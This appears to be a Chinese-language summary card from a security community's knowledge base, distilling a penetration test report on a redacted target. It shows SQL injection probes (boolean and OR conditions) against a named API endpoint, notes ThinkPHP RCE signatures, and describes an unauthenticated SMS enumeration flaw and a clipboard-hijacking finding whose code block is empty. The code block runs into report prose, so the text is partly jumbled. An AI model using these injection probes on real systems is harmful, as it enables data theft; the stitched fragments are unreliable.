# 综合渗透报告（已脱敏示例靶）

- Source report: `report.md`
- Full report: `domains/web-attack/case-reports/tgt-a-example-redacted/report.md`
- Techniques: sqli, rce, payment
- Fused: 2026-09-17

## Key findings (distilled)

- [漏洞总览](#三漏洞总览)
- [P0 严重漏洞详情](#四p0-严重漏洞)
- [P1 高危漏洞详情](#五p1-高危漏洞)
- [P2/P3 中低危漏洞](#六p2p3-中低危漏洞)
- 阻断：** ThinkPHP 5.x RCE 特征（`\think\`、`invokefunction`）

## Repro snippets

```
# 正常请求
GET /index.php/ApiCommon/common_get_author_list?page=1&limit=10
→ {"total":7, "rows":[...]}

# 布尔真条件
?page=1&limit=10 AND '1'='1'
→ {"total":7}   ← 结果不变（真）

# 布尔假条件  
?page=1&limit=10 AND '1'='2'
→ {"total":0}   ← 结果清零（假）

# OR 注入
?page=1&limit=10 OR '1'='1'
→ {"total":1361}  ← 返回全表数据（报告值 1363，漂移±2）
平台资金池较报告时（¥8,811,601）已增加 **¥5,328**，证实平台实时运营。

---

### V-05 无鉴权短信接口 + 号码枚举 + 内存耗尽

**端点：** `POST /index.php/ApiUser/common_send_sms`  
**鉴权：** 无需  

**三重漏洞同时存在：**
**攻击场景：** 攻击者可无限遍历手机号段，精确区分哪些号码已注册本平台。

---

### V-06 加密货币剪贴板劫持（4 个域名仍在线）

**关联域名：** `mal-a.example` / `mal-b.example` / `mal-c.example` / `mal-d.example`  
**到达路径：** OAuth callback 302 随机跳转至上述域名  

**恶意代码（实测提取）：**
```

## When to reuse

- 同类标签命中：sqli, rce, payment
- 先读本卡片，再打开 Full report 复现细节

@TGSEC社区 · @TGSEC-Qtzuu 整理
